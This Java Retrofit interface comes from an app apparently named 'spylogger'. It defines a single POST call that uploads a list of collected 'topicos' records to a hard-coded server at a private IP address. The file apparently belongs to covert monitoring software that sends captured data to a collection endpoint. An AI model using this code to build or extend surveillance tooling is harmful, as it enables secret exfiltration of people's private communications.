package com.gravatasufoca.spylogger.services;

import com.gravatasufoca.spylogger.model.Topico;

import java.util.List;

import retrofit2.Call;
import retrofit2.http.Body;
import retrofit2.http.POST;

/**
 * Created by bruno on 01/12/16.
 */

public interface SendDataInterface {

    String url="http://192.168.1.119/smartlog/api/v1/receber/";

    @POST(url+"topicos")
    Call<Boolean> enviarTopicos(@Body List<Topico> topicos);

}
